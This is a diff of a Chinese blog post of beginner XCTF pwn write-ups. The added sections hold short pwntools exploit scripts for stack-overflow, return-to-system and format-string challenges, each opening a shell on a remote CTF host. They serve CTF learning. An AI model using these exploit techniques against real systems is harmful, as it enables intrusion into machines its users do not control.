@@ -349,7 +349,7 @@
         
           
   <h1 class="title">
-    <a href="/2020/06/28/xctf_pwn_greenhand/">
+    <a href="/2020/06/28/xctf_pwn/">
       从0开始的PWN学习(XCTF)
     </a>
   </h1>
@@ -419,7 +419,55 @@
 <p>PWN是一个黑客语法的俚语词，自”own”这个字引申出来的，这个词的含意在于，玩家在整个游戏对战中处在胜利的优势，或是说明竞争对手处在完全惨败的 情形下，这个词习惯上在网络游戏文化主要用于嘲笑竞争对手在整个游戏对战中已经完全被击败（例如：”You just got pwned!”）。有一个非常著名的国际赛事叫做Pwn2Own，相信你现在已经能够理解这个名字的含义了，即通过打败对手来达到拥有的目的。</p>
 <p>CTF中PWN题型通常会直接给定一个已经编译好的二进制程序（Windows下的EXE或者Linux下的ELF文件等），然后参赛选手通过对二进制程 序进行逆向分析和调试来找到利用漏洞，并编写利用代码，通过远程代码执行来达到溢出攻击的效果，最终拿到目标机器的shell夺取flag。</p>
 <p>漏洞一般是1、gets函数这种对输入没有限制导致溢出。2、格式化字符串漏洞。3、数据类型转换的时候产生了溢出。 总的来说就是对输入的值限制的不够让用户的输入影响了执行流。 那么如何利用漏洞呢？ 在linux中有一个system函数system(“/bin/bash”)这条语句就可以调出shell。让程序执行这个函数就能实现对shell的调用了。</p>
-<h3 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h3>
+<h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h3><hr>
+<p>芜湖，啦啦啦啦啦~</p>
+<p><img src="https://i.loli.net/2020/08/11/wTrYEFWOPo62JZN.png" alt="image-20200811223317436"></p>
+<h3 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h3><hr>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">"220.249.52.133"</span>,<span class="string">"53289"</span>)</span><br><span class="line">payload = <span class="number">4</span>*<span class="string">'a'</span> + p64(<span class="number">0x6E756161</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h3><hr>
+<p>简单栈溢出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">"220.249.52.133"</span>,<span class="string">"33894"</span>)</span><br><span class="line">io.sendline(<span class="string">"1111"</span>)</span><br><span class="line">payload = <span class="number">0x8</span> * <span class="string">'a'</span> + p64(<span class="number">1926</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h3><hr>
+<p>覆盖返回地址为callsystem</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">"220.249.52.133"</span>,<span class="string">"47970"</span>)</span><br><span class="line">payload = <span class="number">0x88</span>*<span class="string">'a'</span> + p64(<span class="number">0x400596</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><hr>
+<p>先覆盖返回地址为_system函数的地址，再把_system函数的参数覆盖外hint(/bin/sh)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">"220.249.52.133"</span>,<span class="string">"34395"</span>)</span><br><span class="line">payload = (<span class="number">0x88</span> + <span class="number">0x4</span>)*<span class="string">'a'</span> + p32(<span class="number">0x08048320</span>) + <span class="number">4</span> * <span class="string">'a'</span> + p32(<span class="number">0x804A024</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Cgfsb"><a href="#Cgfsb" class="headerlink" title="Cgfsb"></a>Cgfsb</h3><hr>
+<p>格式化字符串漏洞，pwnme的地址在bss段，可读可写。所以构造一下再覆盖就OK了。</p>
+<p>基本思路就是，确定覆盖地址，确定相对偏移，进行覆盖。</p>
+<p>覆盖地址即为pwnme地址，相对偏移可以nc过去之后进行测试，pwnme地址算四个字节，要为8再补上四个字节。</p>
+<p>另外程序是顺序执行的所以我没加recvuntil()。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">"220.249.52.133"</span>,<span class="string">"38897"</span>)</span><br><span class="line">io.send(<span class="string">"fsk"</span>)</span><br><span class="line">io.send(p32(<span class="number">0x0804A068</span>) + <span class="string">"aaaa%10$n"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h3><hr>
+<p>栈溢出，覆盖gets()返回地址_system()，再把system的参数设为”/bin/sh“所在的地址，但是这里没有现成的”/bin/sh“，注意到在gets()之前有一个fgets()，其参数name在bss段，所以可以在这里手动输入一个”/bin/sh”。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">"220.249.52.133"</span>,<span class="string">"33144"</span>)</span><br><span class="line">io.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">bin_addr = <span class="number">0x0804A080</span></span><br><span class="line">sys_addr = <span class="number">0x08048420</span></span><br><span class="line">payload = <span class="number">0x2a</span> * <span class="string">'a'</span> + p32(sys_addr) + <span class="number">4</span> * <span class="string">'a'</span> + p32(bin_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h3><hr>
+<p>关注srand()和rand()，设置srand()初始种子值rand()可以产生预期的随机序列。</p>
+<p>利用gets()函数对seed[0]进行覆盖，再用ldd指令获取到guess_num文件的libc，即可产生可控的随机序列。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">"220.249.52.133"</span>,<span class="string">"44225"</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">payload = <span class="number">0x20</span> * <span class="string">'a'</span> + p64(<span class="number">1</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">	num = str(libc.rand()%<span class="number">6</span>+<span class="number">1</span>)</span><br><span class="line">	io.recvuntil(<span class="string">"number:"</span>)</span><br><span class="line">	io.sendline(num)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
           
             <div class='article_footer'>
               
@@ -455,7 +503,7 @@
           
         
           
-            <p>本文永久链接是：<a href=http://x1ngg3.github.io/2020/06/28/xctf_pwn_greenhand/>http://x1ngg3.github.io/2020/06/28/xctf_pwn_greenhand/</a></p>
+            <p>本文永久链接是：<a href=http://x1ngg3.github.io/2020/06/28/xctf_pwn/>http://x1ngg3.github.io/2020/06/28/xctf_pwn/</a></p>
           
         
       </blockquote>
@@ -492,10 +540,10 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-07-22T14:54:59+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-08-15T11:25:05+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>最后更新于：Jul 22, 2020</p>
+    <p>最后更新于：Aug 15, 2020</p>
   </a>
 </div>
 
@@ -522,7 +570,7 @@
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer"
           
-          href="http://connect.qq.com/widget/shareqq/index.html?url=http://x1ngg3.github.io/2020/06/28/xctf_pwn_greenhand/&title=从0开始的PWN学习(XCTF) - X1ngg3&summary=pwn!pwn!pwn!"
+          href="http://connect.qq.com/widget/shareqq/index.html?url=http://x1ngg3.github.io/2020/06/28/xctf_pwn/&title=从0开始的PWN学习(XCTF) - X1ngg3&summary=pwn!pwn!pwn!"
           
           >
           
@@ -534,7 +582,7 @@
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer"
           
-          href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://x1ngg3.github.io/2020/06/28/xctf_pwn_greenhand/&title=从0开始的PWN学习(XCTF) - X1ngg3&summary=pwn!pwn!pwn!"
+          href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://x1ngg3.github.io/2020/06/28/xctf_pwn/&title=从0开始的PWN学习(XCTF) - X1ngg3&summary=pwn!pwn!pwn!"
           
           >
           
@@ -546,7 +594,7 @@
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer"
           
-          href="http://service.weibo.com/share/share.php?url=http://x1ngg3.github.io/2020/06/28/xctf_pwn_greenhand/&title=从0开始的PWN学习(XCTF) - X1ngg3&summary=pwn!pwn!pwn!"
+          href="http://service.weibo.com/share/share.php?url=http://x1ngg3.github.io/2020/06/28/xctf_pwn/&title=从0开始的PWN学习(XCTF) - X1ngg3&summary=pwn!pwn!pwn!"
           
           >
           
@@ -660,7 +708,7 @@ PS：以前听讲座的...</p>
 
 
     <div class='content'>
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#写在前面的话"><span class="toc-text">写在前面的话</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是PWN"><span class="toc-text">什么是PWN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level0"><span class="toc-text">level0</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#写在前面的话"><span class="toc-text">写在前面的话</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是PWN"><span class="toc-text">什么是PWN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-shell"><span class="toc-text">get_shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hello-pwn"><span class="toc-text">hello_pwn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#when-did-you-born"><span class="toc-text">when_did_you_born</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level0"><span class="toc-text">level0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level2"><span class="toc-text">level2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cgfsb"><span class="toc-text">Cgfsb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cgpwn2"><span class="toc-text">cgpwn2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#guess-num"><span class="toc-text">guess_num</span></a></li></ol>
     </div>
   </section>
 
